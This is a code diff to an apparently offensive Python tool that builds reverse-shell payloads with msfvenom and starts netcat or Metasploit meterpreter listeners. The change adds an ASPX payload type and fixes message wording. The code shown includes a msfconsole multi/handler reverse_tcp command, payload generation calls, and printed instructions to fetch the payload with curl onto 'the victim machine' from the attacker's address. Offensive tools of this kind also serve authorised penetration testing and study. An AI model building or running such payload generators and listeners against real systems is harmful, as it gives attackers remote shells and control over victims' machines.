@@ -9,9 +9,9 @@ ap.add_argument('-I', '--interface', required=True, type=str, help='Select the n
 
 ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')
 
-ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf, war or python).')
+ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1, elf, war, aspx or python).')
 
-ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll and .elf payloads).')
+ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (meterpreter): nc or msf (msf only works with .exe, .dll, .aspx and .elf payloads).')
 
 ap.add_argument('-a', '--architecture', required=False, type=str, help='Define the architecture of the machine: x64 or x86 (default value is x64, only needed with .exe, .dll and .elf payloads).')
 
@@ -42,7 +42,7 @@ try:
     if args.httpserver != None:
         int(args.httpserver)
 except:
-    print(red('The port must be a number'))
+    print(red('The port must be a number.'))
     exit()
 
 def Get_IP(NT = args.interface):
@@ -63,13 +63,13 @@ def msf_list(IP = Get_IP(), PORT = port):
     print(blue('Setting up your listener in metasploit.\n'))
     print(green('Waiting to say I\'m in...\n'))
     command = 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp ;set LHOST ' + IP + ' ;set LPORT ' + PORT + ' ; exploit" 2>/dev/null'
-    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll'):
+    if (arch == 'x86' or arch == '86') and (payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx'):
         command = command.replace('/x64', '')
         os.system(command)
         exit()
     elif arch == 'x86' or arch == '86':
         command = command.replace('x64', 'x86')
-    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll':
+    if payload == '.exe' or payload == 'exe' or payload == '.dll' or payload == 'dll' or payload == 'aspx' or payload == '.aspx':
         os.system(command)
     else:
         os.system(command.replace('windows', 'linux'))
@@ -136,6 +136,12 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
         msfvenom = msfvenom.replace('windows/x64/','java/jsp_').replace('exe','war')
         os.system(msfvenom)
         message(file)
+    elif payload == 'aspx' or payload == '.aspx':
+        file = 'autoreverse.aspx'
+        print(blue('\nCreating the payload, please wait.'))
+        msfvenom = msfvenom.replace('/x64','').replace('exe','aspx')
+        os.system(msfvenom)
+        message(file)
     elif payload == 'powershell' or payload == 'ps1' or payload == '.ps1':
         file = 'autoreverse.ps1'
         Check_files(file)
@@ -159,14 +165,14 @@ def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
             print(blue('\nDownload your payload on the victim machine with: ') + red('\ncurl "http://' + IP + ':' + args.httpserver + '/' + file + '" -o autoreverse.dll'))
         message(file)
     else:
-        print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
+        print(red('Your payload option is not in the list, use "--help" to know the payloads list.'))
         exit()
 
 def Check_Port(port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     if s.connect_ex(('127.0.0.1', int(port))) == 0:
         process = os.popen('lsof -i -P -n | grep LISTEN | grep ' + port + ' | awk \'{print $1, $2}\'').read().replace('\n', '')
-        print(red('The port is already used by ' + process + '.'))
+        print(red('The port is already being used by ' + process + '.'))
         exit()
 
 def listeners():
